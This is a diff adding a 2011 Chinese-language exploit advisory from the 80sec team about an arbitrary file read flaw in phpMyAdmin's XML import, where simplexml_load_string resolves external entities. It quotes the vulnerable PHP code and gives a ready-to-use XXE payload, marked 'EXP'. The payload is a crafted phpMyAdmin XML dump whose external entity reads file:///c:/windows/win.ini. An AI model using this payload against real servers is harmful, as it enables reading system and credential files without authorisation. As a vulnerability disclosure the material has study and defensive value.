@@ -1,0 +1,69 @@
+################################################## #
+# Title: PhpMyadmin任意文件读取漏洞
+
+# Time：2011-11-02
+
+# Team:80sec
+
+# Author: 80sec
+################################################### 
+PhpMyadmin实现中错误的使用了simplexml_load_string函数用于xml解析
+但是该函数中默认并没有处理好外部实体的安全性
+导致用户可以借助xml文件读取和访问应用有权限访问的系统和网络资源
+libraries/import/xml.php中
+
+
+
+/////////////////////////////////////////////////////////////////
+EXP:
+/////////////////////////////////////////////////////////////////
+unset($data);
+/**
+* Load the XML string
+*
+* The option LIBXML_COMPACT is specified because it can
+* result in increased performance without the need to
+* alter the code in any way. It's basically a freebee.
+*/
+$xml = simplexml_load_string($buffer, "SimpleXMLElement", LIBXML_COMPACT);
+unset($buffer);
+/**
+* The XML was malformed
+*/
+if ($xml === FALSE) {
+
+可以使用系统中的import功能导入一个精心构造的xml文件
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE wooyun [
+<!ENTITY hi80sec SYSTEM "file:///c:/windows/win.ini">
+]>
+<!--
+- phpMyAdmin XML Dump
+- version 3.4.4
+- http://www.phpmyadmin.net
+-
+- 主机: localhost
+- 生成日期: 2011 年 11 月 01 日 14:56
+- 服务器版本: 5.1.28
+- PHP 版本: 5.2.6
+-->
+<pma_xml_export version="1.0" xmlns:pma="http://www.phpmyadmin.net/some_doc_url/">
+<!--
+- Structure schemas
+-->
+<pma:structure_schemas>
+<pma:database name="test" collation="utf8_general_ci" charset="utf8">
+<pma:table name="ts_ad">
+&hi80sec;
+</pma:table>
+</pma:database>
+</pma:structure_schemas>
+<!--
+- 数据库: 'thinksns'
+-->
+<database name="thinksns">
+<!-- 表 ts_ad -->
+</database>
+</pma_xml_export>
+/////////////////////////////////////////////////////////////////
